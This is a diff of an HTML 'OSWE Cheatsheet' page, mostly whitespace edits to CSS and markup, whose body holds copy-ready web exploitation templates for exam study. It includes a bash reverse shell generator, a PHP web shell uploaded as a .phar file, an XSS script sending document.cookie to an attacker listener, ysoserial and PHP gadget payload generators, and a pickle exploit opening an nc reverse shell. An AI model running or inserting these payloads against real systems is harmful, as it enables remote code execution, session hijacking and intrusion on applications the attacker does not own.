@@ -17,7 +17,6 @@
             margin: 0;
             padding: 0;
         }
-
         /* Header Styles */
         .header {
             display: flex;
@@ -31,7 +30,6 @@
             width: 100%;
             z-index: 1000;
         }
-
         .logo-container {
             font-size: 1.8rem;
             font-weight: bold;
@@ -39,24 +37,20 @@
             text-shadow: 0 0 10px #000000, 0 0 20px #000000;
             animation: flicker 1.5s infinite alternate;
         }
-
         .logo-text {
             margin-right: 50px;
         }
-
         .logo-page {
             width: 70px;
             position: absolute;
             left: 50%;
             transform: translateX(-50%);
         }
-
         @keyframes flicker {
             0% { opacity: 1; text-shadow: 0 0 10px #000000, 0 0 20px #000000; }
             50% { opacity: 0.8; text-shadow: 0 0 5px #000000, 0 0 10px #000000; }
             100% { opacity: 1; text-shadow: 0 0 15px #000000, 0 0 30px #000000; }
         }
-
         /* Hamburger Menu */
         .burger {
             display: flex;
@@ -71,7 +65,6 @@
             position: absolute;
             left: 10px;
         }
-
         .burger div {
             background-color: #000000;
             width: 100%;
@@ -79,19 +72,15 @@
             border-radius: 4px;
             transition: all 0.3s ease;
         }
-
         .burger.active div:nth-child(1) {
             transform: rotate(45deg) translate(4px, 4px);
         }
-
         .burger.active div:nth-child(2) {
             opacity: 0;
         }
-
         .burger.active div:nth-child(3) {
             transform: rotate(-45deg) translate(4px, -4px);
         }
-
         /* Sidebar (Aside) */
         aside {
             display: flex;
@@ -108,20 +97,16 @@
             padding-top: 30px;
             overflow-y: scroll;
         }
-
         aside.active {
             left: 0;
         }
-
         aside .logo {
             font-size: 2em;
             margin-bottom: 30px;
         }
-
         .logo-text-burguer {
             font-size: 1.5rem;
         }
-
         #closeBtn {
             position: absolute;
             top: 15px;
@@ -140,12 +125,10 @@
             justify-content: center;
             align-items: center;
         }
-
         #closeBtn:hover {
             background-color: #e03e2f;
             box-shadow: 0 0 15px rgba(255, 0, 0, 0.7);
         }
-
         /* Overlay */
         .overlay {
             display: none;
@@ -157,22 +140,18 @@
             background: rgba(0, 0, 0, 0.6);
             z-index: 999;
         }
-
         .overlay.active {
             display: block;
         }
-
         /* Navigation Links */
         .nav-links {
             padding: 0;
             margin: 0;
         }
-
         .nav-links li {
             list-style: none;
             margin: 12px 0;
         }
-
         .nav-links a {
             text-decoration: none;
             color: #FFFFFF;
@@ -184,7 +163,6 @@
             display: block;
             transition: all 0.3s ease-in-out;
         }
-
         .nav-links a:hover {
             background: transparent;
             color: #D4AF37;
@@ -192,7 +170,6 @@
             box-shadow: none;
             transform: translateX(8px);
         }
-
         /* Terminal Styles */
         .terminal-container {
             width: 95%;
@@ -203,7 +180,6 @@
             margin: 40px auto;
             box-shadow: 0 0 15px rgba(255, 255, 255, 0.1);
         }
-
         .terminal-header {
             display: flex;
             justify-content: flex-start;
@@ -213,7 +189,6 @@
             border-radius: 8px 8px 0 0;
             position: relative;
         }
-
         .buttons span {
             display: inline-block;
             width: 12px;
@@ -221,24 +196,20 @@
             border-radius: 50%;
             margin-right: 5px;
         }
-
         .red { background-color: #ff5f56; }
         .yellow { background-color: #ffbd2e; }
         .green { background-color: #27c93f; }
-
         .terminal-header .title {
             flex-grow: 1;
             text-align: center;
             font-size: 14px;
             margin: 0 80px 0 60px; /* Prevents overlap with buttons and copy icon */
         }
-
         .terminal-body {
             padding: 15px;
             background-color: #0d1117;
             border-radius: 0 0 8px 8px;
         }
-
         .output {
             width: 100%;
             height: 180px;
@@ -251,7 +222,6 @@
             white-space: pre-wrap;
             word-wrap: break-word;
         }
-
         /* Copy Button */
         #copyBtnTerminal {
             position: absolute;
@@ -263,7 +233,6 @@
             filter: brightness(0) invert(1);
             z-index: 10; /* Ensures button is above other elements */
         }
-
         #copiedText {
             position: absolute;
             top: 10px;
@@ -275,7 +244,6 @@
             color: #D4AF37;
             z-index: 10; /* Ensures text is above other elements */
         }
-
         /* EDR Buttons Container */
         .edr-buttons-container {
             display: flex;
@@ -284,7 +252,6 @@
             justify-content: center;
             margin: 20px 0;
         }
-
         /* Generate Buttons */
         .generate-btn {
             font-size: 16px;
@@ -299,70 +266,57 @@
             transition: all 0.3s ease-in-out;
             padding: 8px 20px;
         }
-
         .generate-btn:hover {
             background-color: #D4AF37;
             color: #FFFFFF;
             border: 2px solid #FFFFFF;
         }
-
         .generate-btn:active {
             background-color: #FFFFFF;
             border: 2px solid #D4AF37;
             transform: scale(0.98);
         }
-
         /* EDR-specific Button Styles */
         .crowdstrike-btn {
             background-color: #FF2D55;
             border-color: #FF5555;
         }
-
         .crowdstrike-btn:hover {
             background-color: #FF5555;
             border-color: #FFFFFF;
         }
-
         .microsoftxdr-btn {
             background-color: #0078D4;
             border-color: #00A1F1;
         }
-
         .microsoftxdr-btn:hover {
             background-color: #00A1F1;
             border-color: #FFFFFF;
         }
-
         .sentinelone-btn {
             background-color: #6F42C1;
             border-color: #8A5AD5;
         }
-
         .sentinelone-btn:hover {
             background-color: #8A5AD5;
             border-color: #FFFFFF;
         }
-
         .defender-btn {
             background-color: #00A4B4;
             border-color: #00CED1;
         }
-
         .defender-btn:hover {
             background-color: #00CED1;
             border-color: #FFFFFF;
         }
-
         .random-btn {
             background-color: #D2B48C;
             border-color: #D4AF37;
         }
-
         .random-btn:hover {
             background-color: #D4AF37;
             border-color: #FFFFFF;
         }
-
         /* Terminal Overlay */
         .terminal-overlay {
             display: none;
@@ -373,7 +327,6 @@
             font-family: monospace;
             white-space: nowrap;
         }
-
         /* Slider for Animation Toggle */
         .slider-container {
             display: flex;
@@ -384,7 +337,6 @@
             margin-top: 40px;
             margin-bottom: -50px;
         }
-
         #animation-toggle {
             appearance: none;
             width: 50px;
@@ -395,11 +347,9 @@
             transition: background-color 0.3s ease;
             cursor: pointer;
         }
-
         #animation-toggle:checked {
             background-color: #4CAF50;
         }
-
         #animation-toggle:before {
             content: "";
             position: absolute;
@@ -411,57 +361,46 @@
             border-radius: 50%;
             transition: left 0.3s ease;
         }
-
         #animation-toggle:checked:before {
             left: 27px;
         }
-
         #animation-status {
             font-size: 16px;
             font-weight: bold;
             color: #333;
             transition: color 0.3s ease;
         }
-
         #animation-toggle:checked + #animation-status {
             color: #4CAF50;
         }
-
         /* Terminal Page Title */
         .terminal-container-page {
             display: flex;
             justify-content: center;
             align-items: center;
         }
-
         .terminal-page-title {
             text-align: center;
         }
-
         .user {
             color: #ff5555;
             font-weight: bold;
         }
-
         .host {
             color: #D4AF37;
             font-weight: bold;
         }
-
         .command-page {
             color: #FFFFFF;
             font-weight: bold;
         }
-
         /* Description and Dividers */
         .description-page {
             text-align: center;
         }
-
         .margin-page-desc {
             margin: 0 100px;
         }
-
         .styled-divider {
             width: 0%;
             height: 2px;
@@ -470,12 +409,10 @@
             border-radius: 5px;
             animation: expand 1s ease-in-out forwards;
         }
-
         @keyframes expand {
             from { width: 0%; }
             to { width: 80%; }
         }
-
         /* Footer */
         .footer {
             display: flex;
@@ -488,7 +425,6 @@
             bottom: 0;
             width: 100%;
         }
-
         .footer-text {
             font-size: 1.2rem;
             font-weight: bold;
@@ -496,7 +432,6 @@
             text-shadow: 0 0 10px #000000, 0 0 20px #000000;
             animation: flicker 1.5s infinite alternate;
         }
-
         /* Syntax Highlighting */
         .comment { color: #569CD6; font-style: italic; }
         .command { color: #D4AF37; font-weight: bold; }
@@ -506,183 +441,146 @@
         .variable { color: #FFA500; font-weight: bold; }
         .datatype { color: #4EC9B0; }
         .string { color: green; }
-
         /* Responsive Design */
         @media screen and (max-width: 768px) {
             .header {
                 flex-direction: column;
             }
-
             .logo-container {
                 font-size: 1.5rem;
             }
-
             .logo-text {
                 margin-right: 20px;
             }
-
             .logo-page {
                 width: 100px;
                 margin-top: -8%;
             }
-
             aside {
                 width: 200px;
                 left: -200px;
             }
-
             .nav-links a {
                 font-size: 1em;
                 padding: 10px 15px;
             }
-
             .terminal-container {
                 width: 90%;
                 padding: 10px;
             }
-
             .output {
                 height: 150px;
                 font-size: 12px;
             }
-
             .margin-page-desc {
                 margin: 0 50px;
             }
-
             .generate-btn {
                 font-size: 14px;
                 padding: 6px 12px;
             }
-
             .edr-buttons-container {
                 flex-direction: column;
                 align-items: center;
             }
-
             .slider-container {
                 flex-direction: column;
                 gap: 5px;
                 margin-top: 20px;
                 margin-bottom: -30px;
             }
-
             .terminal-header .title {
                 margin: 0 60px 0 40px; /* Adjusted for smaller screens */
             }
-
             #animation-toggle {
                 width: 40px;
                 height: 20px;
             }
-
             #animation-toggle:before {
                 width: 18px;
                 height: 18px;
             }
-
             #animation-toggle:checked:before {
                 left: 20px;
             }
-
             #animation-status {
                 font-size: 14px;
             }
-
             .footer-text {
                 font-size: 1rem;
             }
         }
-
         @media screen and (max-width: 480px) {
             .burger {
                 width: 25px;
                 height: 20px;
             }
-
             aside {
                 width: 180px;
                 left: -180px;
             }
-
             .nav-links a {
                 font-size: 0.9em;
                 padding: 8px 12px;
             }
-
             .logo-container {
                 font-size: 1.2rem;
             }
-
             .logo-text {
                 margin-right: 10px;
             }
-
             .terminal-container {
                 width: 100%;
                 padding: 8px;
             }
-
             .output {
                 height: 120px;
                 font-size: 11px;
             }
-
             .terminal-header .title {
                 margin: 0 50px 0 30px; /* Adjusted for smaller screens */
                 font-size: 12px;
             }
-
             #copyBtnTerminal {
                 width: 15px;
                 height: 15px;
                 right: 5px;
                 top: 12px;
             }
-
             #copiedText {
                 right: 25px;
                 top: 12px;
                 font-size: 12px;
             }
-
             .margin-page-desc {
                 margin: 0 20px;
             }
-
             .generate-btn {
                 font-size: 12px;
                 padding: 5px 10px;
             }
-
             .slider-container {
                 margin-top: 40px;
                 margin-bottom: -40px;
             }
-
             #animation-toggle {
                 width: 35px;
                 height: 18px;
             }
-
             #animation-toggle:before {
                 width: 15px;
                 height: 15px;
             }
-
             #animation-toggle:checked:before {
                 left: 18px;
             }
-
             #animation-status {
                 font-size: 12px;
             }
-
             .footer-text {
                 font-size: 0.9rem;
             }
         }
-
         /* Additional styles for main content */
         #main {
             padding-top: 100px; /* Space for fixed header */
@@ -690,16 +588,13 @@
             max-width: 800px;
             margin: 0 auto;
         }
-
         h1, h2, h3, h4 {
             color: #ffffff;
         }
-
         .code-container {
             position: relative;
             margin-bottom: 10px;
         }
-
         pre {
             background-color: #0d1117;
             padding: 15px;
@@ -707,7 +602,6 @@
             overflow-x: auto;
             margin: 0;
         }
-
         .copy-btn {
             position: absolute;
             top: 10px;
@@ -721,19 +615,15 @@
             font-size: 12px;
             transition: background-color 0.3s;
         }
-
         .copy-btn:hover {
             background-color: #333333;
         }
-
         .copy-btn.copied {
             background-color: #4CAF50;
         }
-
         ul li .code-container {
             margin: 5px 0;
         }
-
         /* Ensure syntax highlighting works */
     </style>
 </head>
@@ -748,9 +638,7 @@
             <span class="logo-text">OSWE Cheatsheet</span>
         </div>
     </div>
-
     <div class="overlay" id="overlay"></div>
-
     <aside id="sidebar">
         <button id="closeBtn">&times;</button>
         <div class="logo-text-burguer">Table of Contents</div>
@@ -858,20 +746,14 @@
             <li><a href="#additional-resources">14. Additional Resources</a></li>
         </ul>
     </aside>
-
     <main id="main">
         <h1 id="oswe">OSWE</h1>
-
         <h2 id="concepts">Concepts</h2>
-
         <h3 id="authentication-bypass">Authentication Bypass</h3>
         <p>- SQLi, XSS, Type Juggling, Application Logic Flaws, CORS, CSRF etc.</p>
-
         <h3 id="remote-code-execution">Remote Code Execution</h3>
         <p>- SQLi, Javascript Injection, File upload, Deserialization, SSTI, Prototype Pollution, SSRF.</p>
-
         <h2 id="enable-database-debug-and-logging">Enable Database Debug and Logging</h2>
-
         <h3 id="postgres">Postgres</h3>
         <p>Edit your <code>/etc/postgresql/&lt;version-num&gt;/main/postgresql.conf</code>, and change the lines as follows.</p>
         <p>Note: If you didn't find the postgresql.conf file, then just type <code>$locate postgresql.conf</code> in a terminal</p>
@@ -888,7 +770,6 @@
             <li>Fire query in postgresql <code>select 2+2</code>.</li>
             <li>Find current log in <code>/var/lib/postgresql/10/main/log</code></li>
         </ol>
-
         <h3 id="mysql">MySQL</h3>
         <p>Login to the MySQL instance and check out the <code>general_log</code> and values, whether is set to ON or OFF:</p>
         <div class="code-container">
@@ -901,9 +782,7 @@
             <button class="copy-btn">Copy</button>
         </div>
         <p>Next, check the <code>general_log_file</code> value to see where the actual log file is located using the same.</p>
-
         <h2 id="python-code-snippets">Python Code Snippets</h2>
-
         <h3 id="starting-template">Starting Template</h3>
         <div class="code-container">
             <pre><code class="language-python">import requests
@@ -917,83 +796,58 @@ import argparse
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from http.server import BaseHTTPRequestHandler
 from http.server import HTTPServer
-
-GREEN = '\033[92m'   # Bright Green
-RED = '\033[91m'     # Bright Red
-RESET = '\033[0m'    # Reset to default color
-
+GREEN = '\033[92m' # Bright Green
+RED = '\033[91m' # Bright Red
+RESET = '\033[0m' # Reset to default color
 # Define reusable symbols
-
 success = f"{GREEN}[+]{RESET}"
 failure = f"{RED}[-]{RESET}"
-
 proxies = {"http":"http://127.0.0.1:8080"}
-
 def generate_b64revshell(listener_ip, listener_port):
-
     payload = f"bash -i >& /dev/tcp/{listener_ip}/{listener_port} 0>&1"
     payload_bytes = payload.encode('ascii')
     b64payload = base64.b64encode(payload_bytes)
     base64_payload = b64payload.decode('ascii')
     return base64_payload
-
 def register():
-
     ## Register logic
-    return 'username', 'password'  # Example return
-
+    return 'username', 'password' # Example return
 def login(username, password):
-
     ## Login Logic
-    return {}  # Example cookies
-
+    return {} # Example cookies
 if __name__ == "__main__":
-
     parser = argparse.ArgumentParser(description='Starting Template')
     parser.add_argument('--target-ip', required=True, help='Target IP address')
     parser.add_argument('--listener-ip', required=True, help='Listener IP address')
     parser.add_argument('--listener-port', required=True, help='Listener port')
     args = parser.parse_args()
-
     target_ip = args.target_ip
     listener_ip = args.listener_ip
     listener_port = args.listener_port
-
     # Main Logic
-
     username, password = register()
-    usercookies = login(username, password) 
+    usercookies = login(username, password)
 </code></pre>
             <button class="copy-btn">Copy</button>
         </div>
-
         <h3 id="file-upload-with-additional-parameters">File Upload With Additional Parameters</h3>
         <div class="code-container">
             <pre><code class="language-python">import requests
 import string
 import random
 import io
-
-GREEN = '\033[92m'   # Bright Green
-RED = '\033[91m'     # Bright Red
-RESET = '\033[0m'    # Reset to default color
-
+GREEN = '\033[92m' # Bright Green
+RED = '\033[91m' # Bright Red
+RESET = '\033[0m' # Reset to default color
 # Define reusable symbols
-
 success = f"{GREEN}[+]{RESET}"
 failure = f"{RED}[-]{RESET}"
-
 proxies = {"http":"http://127.0.0.1:8080"}
-
 def uploadFile():
-
     phpsessid = 'example_phpsessid'
-
     url = "http://10.100.102.73:80/item/updateItem.php"
-
     payload_content = b"&lt;?php system($_REQUEST['cmd']); ?&gt;"
     pwny = io.BytesIO(payload_content)
-
     data = {
         "id": "1",
         "id_user": "1",
@@ -1002,17 +856,14 @@ def uploadFile():
                         "BCM2711 Quad core Cortex-A72 ARM v8 1.5GHz Speeder Than Pi 3B"),
         "price": "92"
     }
-
     filename = ''.join(random.choices(string.ascii_letters + string.digits, k=4)) + '.phar'
     files = {
         "image": (filename, pwny, "application/octet-stream")
     }
-    
+   
     cookies = {
-
         "PHPSESSID": phpsessid
     }
-
     r = requests.post(url, data=data, files=files, cookies=cookies, proxies=proxies, allow_redirects=False)
     loginheader = r.headers.get("Location", "")
     match = re.search(r'index\.php$', loginheader)
@@ -1024,23 +875,19 @@ def uploadFile():
 </code></pre>
             <button class="copy-btn">Copy</button>
         </div>
-
         <h3 id="http-file-server-1">HTTP File Server 1</h3>
         <div class="code-container">
             <pre><code class="language-python">from http.server import BaseHTTPRequestHandler
 from http.server import HTTPServer
 import threading
-
-LHOST      = "10.0.0.1"
-WEB_PORT   = 8000
+LHOST = "10.0.0.1"
+WEB_PORT = 8000
 JS_PAYLOAD = "&lt;script&gt;alert(1)&lt;/script&gt;"
-
 def start_web_server():
     class MyHandler(BaseHTTPRequestHandler):
         # Uncomment this method to suppress HTTP logs
         # def log_message(self, format, *args):
-        #     return
-
+        # return
         def do_GET(self):
             if self.path.endswith('/payload.js'):
                 self.send_response(200)
@@ -1048,34 +895,29 @@ def start_web_server():
                 self.send_header("Content-Length", str(len(JS_PAYLOAD)))
                 self.end_headers()
                 self.wfile.write(JS_PAYLOAD.encode())
-            
+           
     httpd = HTTPServer((LHOST, WEB_PORT), MyHandler)
     threading.Thread(target=httpd.serve_forever).start()
 </code></pre>
             <button class="copy-btn">Copy</button>
         </div>
-
         <h3 id="http-file-server-2">HTTP File Server 2</h3>
         <div class="code-container">
             <pre><code class="language-python">from http.server import BaseHTTPRequestHandler, HTTPServer
 import threading
 import os
-
-GREEN = '\033[92m'   # Bright Green
-RED = '\033[91m'     # Bright Red
-RESET = '\033[0m'    # Reset to default color
-
+GREEN = '\033[92m' # Bright Green
+RED = '\033[91m' # Bright Red
+RESET = '\033[0m' # Reset to default color
 # Define reusable symbols
-
 success = f"{GREEN}[+]{RESET}"
 failure = f"{RED}[-]{RESET}"
-
 def start_web_server():
     host = "192.168.45.249"
     port = 80
     directory = "."
     os.chdir(directory)
-    
+   
     class MyHandler(BaseHTTPRequestHandler):
         def do_GET(self):
             try:
@@ -1099,7 +941,6 @@ def start_web_server():
                 self.send_header("Content-type", "text/plain")
                 self.end_headers()
                 self.wfile.write(f"Server error: {str(e)}".encode())
-
     httpd = HTTPServer((host, port), MyHandler)
     print(f"{success} Serving at {host}:{port}")
     threading.Thread(target=httpd.serve_forever, daemon=True).start()
@@ -1107,52 +948,46 @@ def start_web_server():
 </code></pre>
             <button class="copy-btn">Copy</button>
         </div>
-
         <h3 id="http-file-server-3">HTTP File Server 3</h3>
         <div class="code-container">
             <pre><code class="language-python">import threading
 import mimetypes
 import socket
 import os
-
-GREEN = '\033[92m'   # Bright Green
-RED = '\033[91m'     # Bright Red
-RESET = '\033[0m'    # Reset to default color
-
+GREEN = '\033[92m' # Bright Green
+RED = '\033[91m' # Bright Red
+RESET = '\033[0m' # Reset to default color
 # Define reusable symbols
-
 success = f"{GREEN}[+]{RESET}"
 failure = f"{RED}[-]{RESET}"
-
 HOST = '0.0.0.0'
 PORT = 8000
 SERVE_DIR = '.'
-
 def start_web_server():
     def handle_client(conn, addr):
         print(f"{success} Connection from {addr}")
         try:
             # Receive request data
             request = conn.recv(1024).decode('utf-8')
-            # print(f"Received request from {addr}: {request[:100]}...")  # Log first 100 chars        
+            # print(f"Received request from {addr}: {request[:100]}...") # Log first 100 chars
             # Simple parsing: Extract the path from "GET /path HTTP/1.1"
             lines = request.split('\n')
             if lines and 'GET /' in lines[0]:
-                path = lines[0].split(' ')[1]  # e.g., "/filename.txt"
+                path = lines[0].split(' ')[1] # e.g., "/filename.txt"
                 if path == '/':
-                    path = '/index.html'  # Optional: Default to index.html if root, but you can remove this
+                    path = '/index.html' # Optional: Default to index.html if root, but you can remove this
                 full_path = os.path.join(SERVE_DIR, path.lstrip('/'))
-                
+               
                 if os.path.exists(full_path) and os.path.isfile(full_path):
                     # Read and send the file
                     with open(full_path, 'rb') as f:
                         file_data = f.read()
-                    
+                   
                     # Guess MIME type
                     mime_type, _ = mimetypes.guess_type(full_path)
                     if mime_type is None:
                         mime_type = 'application/octet-stream'
-                    
+                   
                     # Basic HTTP response
                     response = (
                         b'HTTP/1.1 200 OK\r\n'
@@ -1175,42 +1010,35 @@ def start_web_server():
             print(f"Error handling {addr}: {e}")
         finally:
             conn.close()
-
     def server():
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Allow reuse of address
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # Allow reuse of address
             s.bind((HOST, PORT))
-            s.listen(5)  # Backlog of 5 for queued connections
+            s.listen(5) # Backlog of 5 for queued connections
             print(f"{success}Background file server listening on {HOST}:{PORT} ... (serving from {SERVE_DIR})")
             while True:
                 conn, addr = s.accept()
                 # Handle each client in a separate thread for concurrency
                 client_thread = threading.Thread(target=handle_client, args=(conn, addr))
                 client_thread.start()
-
     # Start the server in a background thread (daemon=True so it exits when main does)
     server_thread = threading.Thread(target=server, daemon=True)
     server_thread.start()
-
     # Main program continues here (non-blocking)
     print(f"{success} File server started in background. Main program running...")
 </code></pre>
             <button class="copy-btn">Copy</button>
         </div>
-
         <h3 id="xss-cookies-stealer">XSS Cookies Stealer</h3>
         <div class="code-container">
             <pre><code class="language-python">import requests
 import socket
 import base64
 import re
-
 TARGET_URL = 'http://example.com/post'
 HOST = '0.0.0.0'
 PORT = 9001
-
 def send_xss_payload():
-
     payload = "&lt;script&gt;document.location='http://10.100.102.67:9001/?c='+document.cookie&lt;/script&gt;"
     data = {
         'title': 'test',
@@ -1218,8 +1046,7 @@ def send_xss_payload():
         'text': payload,
         'submit': 'Submit'
     }
-
-    proxies = {"http": "http://127.0.0.1:8080"}  # Use Burp or comment this out
+    proxies = {"http": "http://127.0.0.1:8080"} # Use Burp or comment this out
     try:
         r = requests.post(TARGET_URL, data=data, proxies=proxies)
         if r.status_code == 200:
@@ -1228,26 +1055,20 @@ def send_xss_payload():
             print(f"Server responded with status code: {r.status_code}")
     except Exception as e:
         print(f"Error sending payload: {e}")
-
 def listen_for_cookies():
-
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.bind((HOST, PORT))
         s.listen(1)
         print(f"Listening on {HOST}:{PORT} ...")
         print("Waiting for admin to trigger XSS...")
-
         conn, addr = s.accept()
         with conn:
             print(f"Connection from {addr}")
             data = conn.recv(2048)
-
             # Base64 encode for logging
             encoded_data = base64.b64encode(data).decode('utf-8')
             print(f"Base64 Encoded Request: " + encoded_data)
-
             decoded_data = data.decode('utf-8', errors='ignore')
-
             # Extract cookie
             match = re.search(r'PHPSESSID=([^;& ]+)', decoded_data)
             if match:
@@ -1259,25 +1080,20 @@ def listen_for_cookies():
 </code></pre>
             <button class="copy-btn">Copy</button>
         </div>
-
         <h3 id="requests-session-with-proxy">Requests Session with Proxy</h3>
         <div class="code-container">
             <pre><code class="language-python">import requests
-
 def create_session_with_proxy():
     proxies = {
         'http': 'http://127.0.0.1:8080',
         'https': 'http://127.0.0.1:8080',
     }
-
     session = requests.Session()
     session.proxies.update(proxies)
-    session.verify = False  # Disable SSL verification if needed
-
+    session.verify = False # Disable SSL verification if needed
     # Example usage
     response = session.get('https://example.com')
     print(response.text)
-
     # POST example
     data = {'key': 'value'}
     response = session.post('https://example.com/post', data=data)
@@ -1285,11 +1101,9 @@ def create_session_with_proxy():
 </code></pre>
             <button class="copy-btn">Copy</button>
         </div>
-
         <h3 id="generate-reverse-shell-payload">Generate Reverse Shell Payload</h3>
         <div class="code-container">
             <pre><code class="language-python">import base64
-
 def generate_reverse_shell():
     lhost = '192.168.1.100'
     lport = 4444
@@ -1300,25 +1114,19 @@ def generate_reverse_shell():
 </code></pre>
             <button class="copy-btn">Copy</button>
         </div>
-
         <h3 id="websocket-client">WebSocket Client</h3>
         <div class="code-container">
             <pre><code class="language-python">import websocket
 import json
-
 def on_message(ws, message):
     print(f"Received: {message}")
-
 def on_error(ws, error):
     print(f"Error: {error}")
-
 def on_close(ws, close_status_code, close_msg):
     print("Connection closed")
-
 def on_open(ws):
     print("Connection opened")
     ws.send(json.dumps({"action": "example"}))
-
 def run_websocket_client():
     websocket.enableTrace(True)
     ws = websocket.WebSocketApp("ws://example.com/ws",
@@ -1330,12 +1138,10 @@ def run_websocket_client():
 </code></pre>
             <button class="copy-btn">Copy</button>
         </div>
-
         <h3 id="forge-jwt">Forge JWT</h3>
         <div class="code-container">
             <pre><code class="language-python">import jwt
 from datetime import datetime, timedelta, timezone
-
 def forge_jwt():
     key = 'secret'
     algorithm = 'HS256'
@@ -1350,15 +1156,13 @@ def forge_jwt():
 </code></pre>
             <button class="copy-btn">Copy</button>
         </div>
-
         <h3 id="get-current-time-epoch">Get Current Time (EPOCH)</h3>
         <div class="code-container">
             <pre><code class="language-python">import requests
 from datetime import datetime
 import time
-
 def get_epoch_from_server():
-    url = 'http://example.com'  # Replace with the target server URL or IP (e.g., 'http://192.168.1.1')
+    url = 'http://example.com' # Replace with the target server URL or IP (e.g., 'http://192.168.1.1')
     try:
         response = requests.get(url)
         server_date_str = response.headers.get('Date')
@@ -1378,11 +1182,8 @@ def get_epoch_from_server():
 </code></pre>
             <button class="copy-btn">Copy</button>
         </div>
-
         <h2 id="insecure-deserialization">Insecure Deserialization</h2>
-
         <h3 id="java">Java</h3>
-
         <h4 id="methods-and-classes">Methods and Classes</h4>
         <div class="code-container">
             <pre><code class="language-java">ObjectInputStream.readObject()</code></pre>
@@ -1429,7 +1230,6 @@ def get_epoch_from_server():
             <button class="copy-btn">Copy</button>
         </div>
         <p>Part of the SnakeYAML library, used to deserialize YAML into Java objects.</p>
-
         <h4 id="identify-insecure-deserialization-in-source-code">Identify Insecure Deserialization in Source Code</h4>
         <p>When auditing source code, follow these steps to identify potential insecure deserialization vulnerabilities:</p>
         <p>Use code analysis tools (e.g., grep, IDE search, or static analysis tools like SonarQube) to find calls to the methods listed above (e.g., readObject, fromXML, readValue).</p>
@@ -1463,7 +1263,6 @@ ois.setObjectInputFilter(filter);
         </div>
         <p>Identify classes implementing Serializable or Externalizable.</p>
         <p>Check for readObject(), readResolve(), or writeReplace() methods that could be exploited in gadget chains.</p>
-
         <h4 id="exploitation-template-in-python">Exploitation Template in Python</h4>
         <div class="code-container">
             <pre><code class="language-python">import os
@@ -1471,12 +1270,10 @@ import re
 import base64
 import urllib.parse
 import requests
-
 payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2',
             'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'Groovy1',
             'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21',
             'MozillaRhino1', 'Myfaces1', 'ROME', 'Spring1', 'Spring2']
-
 def generate_payloads():
     name = 'Linux'
     cmd = 'ping -c 1 example.com'
@@ -1486,7 +1283,7 @@ def generate_payloads():
         command = os.popen(f'java -jar ysoserial.jar {payload} "{final}"')
         result = command.read()
         command.close()
-        encoded = base64.b64encode(result.encode('latin1'))  # Handle binary properly
+        encoded = base64.b64encode(result.encode('latin1')) # Handle binary properly
         if encoded != b"":
             # Create line breaks at 76 characters
             encoded_str = encoded.decode('utf-8')
@@ -1495,7 +1292,6 @@ def generate_payloads():
             encoded_str = urllib.parse.quote_plus(urllib.parse.quote_plus(encoded_str))
             with open(f'{name}_{payload}_intruder.txt', 'a') as f:
                 f.write(encoded_str + '\n')
-
 def send_payload():
     target_url = 'http://example.com/vuln'
     payload_file = 'Linux_CommonsCollections4_intruder.txt'
@@ -1508,9 +1304,7 @@ def send_payload():
 </code></pre>
             <button class="copy-btn">Copy</button>
         </div>
-
         <h3 id="python-1">Python</h3>
-
         <h4 id="methods-and-classes-1">Methods and Classes</h4>
         <div class="code-container">
             <pre><code class="language-python">pickle.loads()</code></pre>
@@ -1532,33 +1326,27 @@ def send_payload():
             <button class="copy-btn">Copy</button>
         </div>
         <p>From jsonpickle library, deserializes JSON to Python objects.</p>
-
         <h4 id="identify-insecure-deserialization-in-source-code-1">Identify Insecure Deserialization in Source Code</h4>
         <p>Search for calls to <code>pickle.loads()</code>, <code>pickle.load()</code>, <code>yaml.load(..., Loader=yaml.UnsafeLoader)</code>, or similar.</p>
         <p>Trace if input is from untrusted sources like user input, files, or network.</p>
         <p>Check for lack of validation or safe loaders (e.g., use SafeLoader for YAML).</p>
-
         <h4 id="exploitation-template-in-python-1">Exploitation Template in Python</h4>
         <div class="code-container">
             <pre><code class="language-python">import pickle
 import base64
 import os
 import requests
-
 class RCE:
     def __reduce__(self):
         cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
                '/bin/sh -i 2>&1 | nc 10.0.0.1 4444 > /tmp/f')
         return os.system, (cmd,)
-
 def generate_payload():
     pickled = pickle.dumps(RCE())
     return base64.urlsafe_b64encode(pickled).decode('utf-8')
-
 def send_payload():
     target_url = 'http://example.com/vuln'
     param_name = 'pickled'
-
     payload = generate_payload()
     print(f"Generated Payload: {payload}")
     data = {param_name: payload}
@@ -1567,9 +1355,7 @@ def send_payload():
 </code></pre>
             <button class="copy-btn">Copy</button>
         </div>
-
         <h3 id="php">PHP</h3>
-
         <h4 id="methods-and-classes-2">Methods and Classes</h4>
         <div class="code-container">
             <pre><code class="language-php">unserialize()</code></pre>
@@ -1587,19 +1373,16 @@ def send_payload():
         </div>
         <p>Magic method called when object is destroyed, often used in gadget chains.</p>
         <p>Libraries like Symfony, Laravel may have vulnerable gadgets.</p>
-
         <h4 id="identify-insecure-deserialization-in-source-code-2">Identify Insecure Deserialization in Source Code</h4>
         <p>Search for calls to <code>unserialize($_GET['data'])</code> or similar with user input.</p>
         <p>Look for magic methods like __destruct, __wakeup in classes.</p>
         <p>Check for lack of 'allowed_classes' option in unserialize.</p>
-
         <h4 id="exploitation-template-in-python-2">Exploitation Template in Python</h4>
         <div class="code-container">
             <pre><code class="language-python">import os
 import base64
 import requests
 import urllib.parse
-
 def generate_payload():
     gadget = 'Monolog/RCE1'
     command = 'id'
@@ -1612,11 +1395,9 @@ def generate_payload():
     # URL encode
     encoded = urllib.parse.quote_plus(encoded)
     return encoded
-
 def send_payload():
     target_url = 'http://example.com/vuln'
     param_name = 'data'
-
     payload = generate_payload()
     print(f"Generated Payload: {payload}")
     data = {param_name: payload}
@@ -1625,9 +1406,7 @@ def send_payload():
 </code></pre>
             <button class="copy-btn">Copy</button>
         </div>
-
         <h3 id="nodejs">Node.js</h3>
-
